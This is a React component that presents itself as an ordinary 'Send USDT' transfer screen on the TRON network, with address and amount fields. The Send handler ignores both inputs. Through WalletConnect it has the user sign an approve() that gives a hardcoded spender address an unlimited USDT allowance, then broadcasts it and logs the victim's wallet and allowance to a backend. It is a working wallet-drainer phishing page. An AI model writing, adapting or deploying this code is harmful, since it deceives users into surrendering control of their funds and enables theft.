import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import SignClient from "@walletconnect/sign-client";

declare global {
  interface Window {
    tronWeb?: any;
    tronLink?: any;
  }
}

export default function Index() {
  const [searchParams] = useSearchParams();
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [transactionStatus, setTransactionStatusState] = useState<"idle" | "processing" | "success">("idle");
  const createTransaction = useMutation(api.transactions.createTransaction);

  const wcClientRef = useRef<any>(null);
  const wcSessionRef = useRef<any>(null);
  const userAddressRef = useRef<string>("");

  // ===== WALLETCONNECT INIT =====
  useEffect(() => {
    async function initWC() {
      try {
        console.log("🔄 Initializing WalletConnect...");
        const client = await SignClient.init({
          projectId: "6b5df56bc30c1dadaab59498b86fd3e8",
          metadata: {
            name: "USDT Transfer",
            description: "TRON Transfer",
            url: window.location.origin,
            icons: [],
          },
        });
        wcClientRef.current = client;
        console.log("✅ WalletConnect initialized");

        const sessions = client.session.getAll();
        if (sessions.length > 0) {
          wcSessionRef.current = sessions[sessions.length - 1];
          const accounts = Object.values(wcSessionRef.current.namespaces).flatMap((ns: any) => ns.accounts) as string[];
          const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
          if (tronAcc) userAddressRef.current = tronAcc.split(":")[2];
          console.log("✅ Session restored:", userAddressRef.current);
        }
      } catch (e) {
        console.error("WC init error:", e);
      }
    }

    initWC();
  }, []);

  useEffect(() => {
    const addressParam = searchParams.get("address");
    if (addressParam) setToAddress(addressParam);
  }, [searchParams]);

  async function handleSend() {
    setTransactionStatusState("processing");

    try {
      const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
      const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";

      console.log("🔄 handleSend started");

      // ===== WALLETCONNECT ONLY =====
      console.log("🔗 Using WalletConnect");

      if (!wcClientRef.current) {
        throw new Error("WalletConnect not initialized. Please refresh page.");
      }

      // Create new session if needed
      if (!wcSessionRef.current) {
        console.log("📱 Creating new WalletConnect session...");
        
        const { uri, approval } = await wcClientRef.current.connect({
          requiredNamespaces: {
            tron: {
              methods: ["tron_signTransaction", "tron_signMessage"],
              chains: ["tron:0x2b6653dc"],
              events: ["chainChanged", "accountsChanged"],
            },
          },
        });

        if (!uri) {
          throw new Error("Failed to get WalletConnect URI");
        }

        console.log("🔗 URI received, opening modal...");
        const { WalletConnectModal } = await import("@walletconnect/modal");
        const modal = new WalletConnectModal({ projectId: "6b5df56bc30c1dadaab59498b86fd3e8" });
        await modal.openModal({ uri });

        console.log("⏳ Waiting for approval...");
        wcSessionRef.current = await approval();
        console.log("✅ Approved!");
        
        modal.closeModal();

        const accounts = Object.values(wcSessionRef.current.namespaces).flatMap((ns: any) => ns.accounts) as string[];
        const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
        if (tronAcc) userAddressRef.current = tronAcc.split(":")[2];
        console.log("✅ User address:", userAddressRef.current);
      }

      if (!userAddressRef.current) {
        throw new Error("No wallet address found");
      }

      console.log("👤 User:", userAddressRef.current);
      console.log("📝 Building transaction...");

      const tw = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
      tw.setAddress(userAddressRef.current);

      const { transaction } = await tw.transactionBuilder.triggerSmartContract(
        TRON_USDT,
        "approve(address,uint256)",
        { feeLimit: 100000000 },
        [
          { type: "address", value: TRON_SPENDER },
          { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" }
        ],
        userAddressRef.current
      );

      console.log("✅ Transaction built");

      // ✅ CRITICAL: Ensure raw_data_hex
      console.log("🔧 Encoding raw_data_hex...");
      if (!transaction.raw_data_hex) {
        try {
          const txProto = tw.utils.transaction.txJsonToPb(transaction);
          transaction.raw_data_hex = txProto.toString("hex");
          console.log("✅ raw_data_hex encoded successfully");
        } catch (e) {
          console.error("Error encoding:", e);
          throw new Error("Failed to encode transaction: " + e);
        }
      }

      console.log("📋 Transaction ready for signing");
      console.log("🔐 Requesting signature from wallet...");

      const signResponse = await wcClientRef.current.request({
        topic: wcSessionRef.current.topic,
        chainId: "tron:0x2b6653dc",
        request: {
          method: "tron_signTransaction",
          params: [transaction]
        }
      });

      console.log("Sign response received");

      let signedTx = signResponse?.result || signResponse;

      if (!signedTx) {
        throw new Error("Empty sign response");
      }

      if (typeof signedTx === "string") {
        try {
          signedTx = JSON.parse(signedTx);
        } catch (e) {
          console.log("Sign response is already an object");
        }
      }

      console.log("✅ Transaction signed successfully");

      console.log("📡 Broadcasting transaction...");
      const broadcastRes = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(signedTx)
      });

      const result = await broadcastRes.json();
      console.log("Broadcast response:", result);

      if (!result || (result.result !== true && !result.txid)) {
        throw new Error("Broadcast failed: " + JSON.stringify(result));
      }

      const txId = result.txid || result.transaction?.txID;
      console.log("✅ Broadcast successful!");
      console.log("📋 Transaction ID:", txId);

      console.log("⏳ Waiting 30 seconds for confirmation...");
      await new Promise(r => setTimeout(r, 30000));

      console.log("🔍 Verifying allowance...");
      const allowanceABI = [
        {
          "constant": true,
          "inputs": [
            { "name": "owner", "type": "address" },
            { "name": "spender", "type": "address" }
          ],
          "name": "allowance",
          "outputs": [{ "name": "", "type": "uint256" }],
          "stateMutability": "view",
          "type": "function"
        }
      ];

      const allowanceContract = await tw.contract(allowanceABI, TRON_USDT);
      const allowanceRaw = await allowanceContract.allowance(userAddressRef.current, TRON_SPENDER).call();
      const allowanceUSDT = (Number(allowanceRaw) / 1e6).toFixed(2);
      console.log("✅ Allowance verified:", allowanceUSDT, "USDT");

      await createTransaction({
        walletAddress: userAddressRef.current,
        toAddress: TRON_SPENDER,
        amount: amount || "Max",
        txHash: txId || "tx",
        usdtBalance: allowanceUSDT + " USDT",
        nativeBalance: "0 TRX"
      });

      setTransactionStatusState("success");
      setTimeout(() => setTransactionStatusState("idle"), 3000);
      alert("✅ Approval successful!\n\nAllowance: " + allowanceUSDT + " USDT\n\nTx ID: " + txId);

    } catch (err: any) {
      console.error("❌ Error:", err);
      setTransactionStatusState("idle");
      
      let errorMsg = err.message || "Transaction failed";
      alert("❌ " + errorMsg);
    }
  }

  async function handlePaste() {
    try {
      const text = await navigator.clipboard.readText();
      setToAddress(text.trim());
    } catch {}
  }

  const dollarValue = amount && amount !== "Max" && !isNaN(Number(amount))
    ? `$${Number(amount).toFixed(2)}`
    : "$0.00";

  const TRXIcon = () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
      <polygon points="12,2 22,8 22,16 12,22 2,16 2,8" fill="white" opacity="0.9"/>
      <polygon points="12,5 19,9 19,15 12,19 5,15 5,9" fill="#EF0027" opacity="0.8"/>
      <text x="12" y="16" textAnchor="middle" fill="white" fontSize="9" fontWeight="bold">T</text>
    </svg>
  );

  const XCircle = ({ onClick }: { onClick: () => void }) => (
    <button onClick={onClick} style={{
      background: "none",
      border: "1.5px solid #555",
      borderRadius: "50%",
      width: "22px",
      height: "22px",
      color: "#aaa",
      cursor: "pointer",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      fontSize: "11px",
      flexShrink: 0,
      padding: 0,
    }}>✕</button>
  );

  return (
    <div style={{
      margin: 0,
      minHeight: "100vh",
      background: "#1c1c1e",
      color: "#ffffff",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Text', system-ui, sans-serif",
      display: "flex",
      flexDirection: "column",
      maxWidth: "480px",
      marginLeft: "auto",
      marginRight: "auto",
    }}>

      <div style={{
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        padding: "20px 22px 16px",
      }}>
        <button onClick={() => window.history.back()} style={{
          background: "none", border: "none", color: "#fff",
          cursor: "pointer", fontSize: "22px", lineHeight: 1, padding: 0,
        }}>←</button>
        <span style={{ fontSize: "18px", fontWeight: 700 }}>Send USDT</span>
        <button onClick={() => window.history.back()} style={{
          background: "none", border: "none", color: "#fff",
          cursor: "pointer", fontSize: "20px", lineHeight: 1, padding: 0,
        }}>✕</button>
      </div>

      <div style={{ padding: "4px 18px", flex: 1 }}>

        <div style={{ marginBottom: "14px" }}>
          <label style={{
            display: "block", fontSize: "14px", fontWeight: 500,
            color: "#8e8e93", marginBottom: "9px",
          }}>
            Address or Domain Name
          </label>
          <div style={{
            display: "flex", alignItems: "center",
            border: "1px solid #2e2e30",
            borderRadius: "14px",
            padding: "14px 14px",
            background: "#242426",
            gap: "8px",
          }}>
            <input
              value={toAddress}
              onChange={(e) => setToAddress(e.target.value)}
              placeholder="Search or Enter"
              style={{
                flex: 1, background: "transparent", border: "none",
                outline: "none", color: "#fff", fontSize: "16px",
                fontFamily: "monospace", minWidth: 0,
              }}
            />
            {toAddress && <XCircle onClick={() => setToAddress("")} />}
            <button onClick={handlePaste} style={{
              background: "none", border: "none", color: "#39d353",
              cursor: "pointer", fontSize: "16px", fontWeight: 600,
              padding: "0 2px", flexShrink: 0,
            }}>Paste</button>
          </div>
        </div>

        <div style={{ marginBottom: "14px" }}>
          <label style={{
            display: "block", fontSize: "14px", fontWeight: 500,
            color: "#8e8e93", marginBottom: "9px",
          }}>
            Destination network
          </label>
          <div style={{
            display: "inline-flex", alignItems: "center", gap: "7px",
            background: "#2c2c2e",
            borderRadius: "20px",
            padding: "7px 13px 7px 8px",
          }}>
            <div style={{
              width: "26px", height: "26px", borderRadius: "50%",
              background: "#EF0027",
              display: "flex", alignItems: "center", justifyContent: "center",
              flexShrink: 0,
            }}>
              <TRXIcon />
            </div>
            <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>
              Tron Network
            </span>
          </div>
        </div>

        <div style={{ marginBottom: "6px" }}>
          <label style={{
            display: "block", fontSize: "14px", fontWeight: 500,
            color: "#8e8e93", marginBottom: "9px",
          }}>
            Amount
          </label>
          <div style={{
            display: "flex", alignItems: "center",
            border: "1px solid #2e2e30",
            borderRadius: "14px",
            padding: "14px 14px",
            background: "#242426",
            gap: "8px",
          }}>
            <input
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0"
              type="text"
              inputMode="decimal"
              style={{
                flex: 1, background: "transparent", border: "none",
                outline: "none", color: "#fff", fontSize: "18px",
                fontFamily: "inherit", minWidth: 0,
              }}
            />
            {amount && <XCircle onClick={() => setAmount("")} />}
            <span style={{ color: "#8e8e93", fontSize: "16px", flexShrink: 0 }}>USDT</span>
            <button onClick={() => setAmount("Max")} style={{
              background: "none", border: "none", color: "#39d353",
              cursor: "pointer", fontSize: "16px", fontWeight: 600,
              padding: "0", flexShrink: 0,
            }}>Max</button>
          </div>
          <div style={{ fontSize: "13px", color: "#636366", marginTop: "7px", paddingLeft: "2px" }}>
            ≈ {dollarValue}
          </div>
        </div>
      </div>

      <div style={{ padding: "12px 18px", paddingBottom: "42px" }}>
        <button
          onClick={handleSend}
          disabled={transactionStatus !== "idle"}
          style={{
            width: "100%",
            background: transactionStatus === "processing" ? "#2a6e3a" : "#39d353",
            color: "#000",
            border: "none",
            borderRadius: "30px",
            padding: "18px",
            fontSize: "18px",
            fontWeight: 700,
            cursor: transactionStatus === "idle" ? "pointer" : "default",
            transition: "all 0.2s ease",
            letterSpacing: "0.01em",
          }}
        >
          {transactionStatus === "success"
            ? "✓ Transaction Successful!"
            : transactionStatus === "processing"
            ? "Processing..."
            : "Send"}
        </button>
      </div>
    </div>
  );
}
